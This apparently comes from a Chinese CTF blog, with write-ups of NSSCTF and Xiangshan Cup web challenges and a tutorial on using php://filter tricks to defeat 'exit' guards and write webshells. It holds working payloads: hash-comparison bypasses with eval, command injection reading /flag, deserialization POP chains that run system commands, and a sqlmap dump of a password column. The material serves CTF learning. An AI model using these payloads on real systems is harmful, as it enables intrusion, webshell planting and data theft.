+          <a href="#2023年SWPU-NSS-秋季招新赛-校外赛道" class="heading-link"><i class="fas fa-link"></i></a><a href="#2023年SWPU-NSS-秋季招新赛-校外赛道" class="headerlink" title="2023年SWPU NSS 秋季招新赛 (校外赛道)"></a>2023年SWPU NSS 秋季招新赛 (校外赛道)</h1>
+      
+        <h2 id="一键连接">
+          <a href="#一键连接" class="heading-link"><i class="fas fa-link"></i></a><a href="#一键连接" class="headerlink" title="一键连接!"></a>一键连接!</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$md5_1 = $_GET[&#x27;md5_1&#x27;];</span><br><span class="line">$md5_2 = $_GET[&#x27;md5_2&#x27;];</span><br><span class="line">$sha1_1 = $_GET[&#x27;sha1_1&#x27;];</span><br><span class="line">$sha1_2 = $_GET[&#x27;sha1_2&#x27;];</span><br><span class="line">$new_player =$_GET[&#x27;new_player&#x27;];</span><br><span class="line">if ($md5_1 !== $md5_2 &amp;&amp; md5($md5_1) === md5($md5_2)) &#123;</span><br><span class="line">    if ($sha1_1 != $sha1_2 &amp;&amp; sha1($sha1_1) === sha1($sha1_2)) &#123;</span><br><span class="line">        if (file_get_contents($new_player) === &quot;Welcome to NSSCTF!!!&quot;) &#123;</span><br><span class="line">            echo &quot;Congratulations~~~~~~~~~&quot;;</span><br><span class="line">            echo &quot;试试need Antsword&lt;br/&gt;&quot;;</span><br><span class="line">            @eval($_POST[&#x27;Nss&#x27;]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;可曾听过data协议?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;sha1又如何相等呢&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;如何让md5值相等呢¿&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>
+
+<p>?md5_1[]&#x3D;QNKCDZO&amp;md5_2[]&#x3D;s155964671a&amp;sha1_1[]&#x3D;aaroZmOk&amp;sha1_2[]&#x3D;aaK1STfY&amp;new_player&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Welcome to NSSCTF!!!</p>
+<p>Nss&#x3D;system(“cat &#x2F;flag”);</p>
+
+        <h2 id="NSS-HTTP-CHEKER">
+          <a href="#NSS-HTTP-CHEKER" class="heading-link"><i class="fas fa-link"></i></a><a href="#NSS-HTTP-CHEKER" class="headerlink" title="NSS_HTTP_CHEKER"></a>NSS_HTTP_CHEKER</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?this_is_get=get_%1t HTTP/1.1</span><br><span class="line">Host: node6.anna.nssctf.cn:28397</span><br><span class="line">User-Agent: NSSCTF</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:28397</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://node6.anna.nssctf.cn:28397/</span><br><span class="line">Cookie: PHPSESSID=1b41efa492475836bbc4873098999ab3;this_is_cookie=cookie_suki_desu~</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">this_is_post=p03t</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="Pingpingping">
+          <a href="#Pingpingping" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pingpingping" class="headerlink" title="Pingpingping"></a>Pingpingping</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$_ping = $_GET[&#x27;Ping_ip.exe&#x27;];</span><br><span class="line">if(isset($_ping))&#123;</span><br><span class="line">    system(&quot;ping -c 3 &quot;.$_ping);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $data = base64_encode(file_get_contents(&quot;error.png&quot;));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/png;base64,$data&#x27;/&gt;&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>
+
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://node6.anna.nssctf.cn:28422/?Ping%5Bip.exe=127.0.0.1;cat">http://node6.anna.nssctf.cn:28422/?Ping[ip.exe=127.0.0.1;cat</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> &#x2F;flag</p>
+
+        <h2 id="UnS3rialize">
+          <a href="#UnS3rialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#UnS3rialize" class="headerlink" title="UnS3rialize"></a>UnS3rialize</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NSS</span><br><span class="line">&#123;</span><br><span class="line">    public $cmd=&quot;cat /f*&quot;;</span><br><span class="line">    function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;&quot;;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;W4keup!!!&lt;br/&gt;&quot;;</span><br><span class="line">        $this-&gt;cmd = &quot;echo Welcome to NSSCTF&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $whoami;</span><br><span class="line">    function __get($argv)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;what do you want?&quot;;</span><br><span class="line">        $want = $this-&gt;whoami;</span><br><span class="line">        return $want();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class T</span><br><span class="line">&#123;</span><br><span class="line">    public $sth;</span><br><span class="line">    function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger&quot;;</span><br><span class="line">        return $this-&gt;sth-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class F</span><br><span class="line">&#123;</span><br><span class="line">    public $user = &quot;SWPU&quot;;</span><br><span class="line">    public $passwd = &quot;NSS&quot;;</span><br><span class="line">    public $notes;</span><br><span class="line">//    function __construct($user, $passwd)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;user = $user;</span><br><span class="line">//        $this-&gt;passwd = $passwd;</span><br><span class="line">//    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;user === &quot;SWPU&quot; &amp;&amp; $this-&gt;passwd === &quot;NSS&quot;) &#123;</span><br><span class="line">            echo &quot;Now you know how to use __construct&lt;br/&gt;&quot;;</span><br><span class="line">            echo &quot;your notes&quot;.$this-&gt;notes;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;N0!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new F();</span><br><span class="line">$a-&gt;notes=new T();</span><br><span class="line">$a-&gt;notes-&gt;sth=new C();</span><br><span class="line">$a-&gt;notes-&gt;sth-&gt;whoami=new NSS();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></div></figure>
+
+<blockquote>
+<p>O:1:”F”:3:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:1:{s:3:”cmd”;s:7:”cat &#x2F;f*”;}}}}</p>
+</blockquote>
+<p>base64编码传上去即可</p>
+<p>python sqlmap.py -r 1.txt -D school -T students -C name,student_id,grade,password -dump -batch</p>
+<p>在表格里可以看到flag</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/">File_put_contents利用技巧(php://filter协议）</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="file-put-contents利用技巧-php-filter协议）">
+          <a href="#file-put-contents利用技巧-php-filter协议）" class="heading-link"><i class="fas fa-link"></i></a><a href="#file-put-contents利用技巧-php-filter协议）" class="headerlink" title="file_put_contents利用技巧(php:&#x2F;&#x2F;filter协议）"></a>file_put_contents利用技巧(php:&#x2F;&#x2F;filter协议）</h1>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class="line">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br></pre></td></tr></table></div></figure>
+
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php:&#x2F;&#x2F;filter协议来施展魔法。</p>
+<p><strong>#方法一、base64编码</strong></p>
+<p>使用php:&#x2F;&#x2F;filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
+<p>众所周知，base64编码中只包含64个可打印字符（A-Z a-z 0-9 + &#x2F;）’&#x3D;’补位，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode  来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
+<p>“phpexit”一共7个字符，<strong>因为base64算法解码时是4个byte一组</strong>，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
+<p>最终效果：</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406235335043-1930261389.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/AAwangzhan\1\hexoblog\source\image\1964477-20200406235335043-1930261389.png"></a></p>
+<p><strong>#方法二、利用字符串操作方法+base64组合拳</strong></p>
+<p>除了使用base64特性的方法外，我们还可以利用php:&#x2F;&#x2F;filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
+<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。</p>
+<p>编写如下测试代码即可查看 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D;php:&#x2F;&#x2F;input 的效果：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&#x27;php://filter/read=string.strip_tags/resource=php://input&#x27;);</span><br></pre></td></tr></table></div></figure>
+
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234627327-1601681134.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/AAwangzhan\1\hexoblog\source\image\1964477-20200406234627327-1601681134.png"></a></p>
+<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
+<p>万幸的是，php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<p>最终效果：</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234831984-1876664653.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/AAwangzhan\1\hexoblog\source\image\1964477-20200406234831984-1876664653.png"></a></p>
+<p><strong>#方法三、ROT13编码</strong></p>
+<p>原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407000202377-1581427195.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/AAwangzhan\1\hexoblog\source\image\1964477-20200407000202377-1581427195.png"></a></p>
+<p> <strong>Round 2</strong> </p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_POST[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($a,&quot;&lt;?php exit();&quot;.$a);</span><br></pre></td></tr></table></div></figure>
+
+<p>这种是前后两个变量相同，假设$a可控情况。</p>
+<p>这种相同变量的构造方式和不同变量的构造方式思路是大差不差的，都是需要干掉<code>&lt;?php exit();</code>，只不过构造起来相对更复杂一些。</p>
+<p><strong>#方法一、base64编码</strong></p>
+<p>根据前面介绍的不同变量的构造方法，很容易拓展到相同的变量，同样利用php:&#x2F;&#x2F;filter来构造，反正后面是写入的内容，只要在后面解码的时候把shell解码出来，不需要的东西解码成乱码即可，而Base64构造的话，例如</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php</span><br><span class="line"></span><br><span class="line">（    &lt;?php phpinfo();?&gt;    base64编码    PD9waHAgcGhwaW5mbygpOz8+      ）</span><br></pre></td></tr></table></div></figure>
+
+<p>构造的shell可以放在过滤器的位置和文件名位置都可以（其他编码有时候会有空格什么的乱码，文件名不一定好用），php:&#x2F;&#x2F;filter面对不可用的规则（一串base64）是报个Warning，绕后跳过继续执行的（不会退出），所以按理说这样构造是“很完美”的。我们看下base-decode哪些字符👇</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php//filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=shellphp</span><br></pre></td></tr></table></div></figure>
+
+<p>而默认情况下base64编码是以 &#x3D; 作为结尾的，所以正常解码的时候到了 &#x3D; 就解码结束了，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 &#x3D; 过不掉，所以导致过滤器解码失败，从而报错…</p>
+<p>这里用base64编码我还没找到好的方法，待补充…</p>
+<p><strong>#方法二、ROT13</strong></p>
+<p>rot13编码就不存在base64的问题，所以和前面base64构造的思路一样</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=shell.php</span><br></pre></td></tr></table></div></figure>
+
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407103428847-745843372.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/AAwangzhan\1\hexoblog\source\image\1964477-20200407103428847-745843372.png"></a><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407103501626-1447360416.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/AAwangzhan\1\hexoblog\source\image\1964477-20200407103501626-1447360416.png"></a></p>
+<p> 和前面提到的一样，这种方法是需要服务器没有开启短标签的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p>
+<p><strong>#方法三、iconv字符编码转换</strong></p>
+<p>通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式，而我们构造的转成可正常解析的</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);</span><br><span class="line">?&lt;hp phpipfn(o;)&gt;?</span><br></pre></td></tr></table></div></figure>
+
+<p>这里用的是UCS-2，当然我们也可以用UCS-4</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#x27;aa&lt;?php phpinfo();?&gt;&#x27;);</span><br><span class="line">?&lt;aa phpiphp(ofn&gt;?;)</span><br></pre></td></tr></table></div></figure>
+
+<p>通过UCS-2或者UCS-4的方式，对目标字符串进行2&#x2F;4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">**or**</span><br><span class="line"></span><br><span class="line">$a=&#x27;php://filter/convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=shell.php&#x27;;</span><br><span class="line">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?;)之前字符个数是4的倍数,所以补充了 xxx</span><br></pre></td></tr></table></div></figure>
+
+<p> <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407105517997-451500709.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/AAwangzhan\1\hexoblog\source\image\1964477-20200407105517997-451500709.png"></a></p>
+<p><strong>#方法四、iconv字符编码转换+ROT13编码组合拳</strong></p>
+<p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，原因前面描述过了，就不赘述，这里就用UCS-2和rot13举一个例子吧</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = &#x27;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=shell.php&#x27;</span><br><span class="line">#先将 &lt;?php phpinfo(); ?&gt; 进行rot13得到&lt;?cuc cucvasb();?&gt;</span><br><span class="line">#再对&lt;?cuc cucvasb();?&gt;进行UCS2编码转换得到?&lt;uc cucvcsa(b;)&gt;?</span><br><span class="line">#最后x 补位</span><br><span class="line">#最终得到x?&lt;uc cucvcsa(b;)&gt;?</span><br></pre></td></tr></table></div></figure>
+
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407111602416-1849632067.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/AAwangzhan\1\hexoblog\source\image\1964477-20200407111602416-1849632067.png"></a></p>
+<p> 为何不用string.strip_tags呢？因为rot13转换的同样会被strip_tags方法给删除了，而UCS-2或UCS-4构造的也同样会被strip_tags方法给删除，这里需要找其他的编码方式进行构造。</p>
+<p>参考：</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BXBe0sviIpjzQb49fk1TCg">https://mp.weixin.qq.com/s/BXBe0sviIpjzQb49fk1TCg</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/18/%E9%A6%99%E5%B1%B1%E6%9D%AF/">香山杯</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-10-30</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="香山杯">
+          <a href="#香山杯" class="heading-link"><i class="fas fa-link"></i></a><a href="#香山杯" class="headerlink" title="香山杯"></a>香山杯</h1>
+      
+        <h2 id="PHP-unserialize-pro">
+          <a href="#PHP-unserialize-pro" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Welcome</span><br><span class="line">&#123;</span><br><span class="line">    public $name=&#x27;A_G00d_H4ck3r&#x27;;</span><br><span class="line">    public $arg = &#x27;welcome&#x27;;</span><br><span class="line"></span><br><span class="line">//    public function __construct()</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;name = &#x27;Wh0 4m I?&#x27;;</span><br><span class="line">//    &#125;</span><br><span class="line"></span><br><span class="line">​    public function __destruct()</span><br><span class="line">​    &#123;</span><br><span class="line">​        if ($this-&gt;name == &#x27;A_G00d_H4ck3r&#x27;) &#123;</span><br><span class="line">​            echo &quot;1&quot;.$this-&gt;arg=&#x27;1&#x27;;</span><br><span class="line">​        &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class G00d&#123;</span><br><span class="line">    public $shell;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $shell = $this-&gt;shell;</span><br><span class="line">        $cmd = $this-&gt;cmd;</span><br><span class="line">        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $cmd))&#123;</span><br><span class="line">            die(&quot;U R A BAD GUY&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval($shell($cmd));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class H4ck3r</span><br><span class="line">&#123;</span><br><span class="line">    public $func;</span><br><span class="line"></span><br><span class="line">​    public function __toString()</span><br><span class="line">​    &#123;</span><br><span class="line">​        $function = $this-&gt;func;</span><br><span class="line">​        return $function();</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Welcome();</span><br><span class="line">$a-&gt;name=new H4ck3r();</span><br><span class="line">$a-&gt;name-&gt;func=new G00d();</span><br><span class="line">$a-&gt;name-&gt;func-&gt;shell=&#x27;strtolower&#x27;;</span><br><span class="line">$a-&gt;name-&gt;func-&gt;cmd=&#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&#x27;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></div></figure>
+
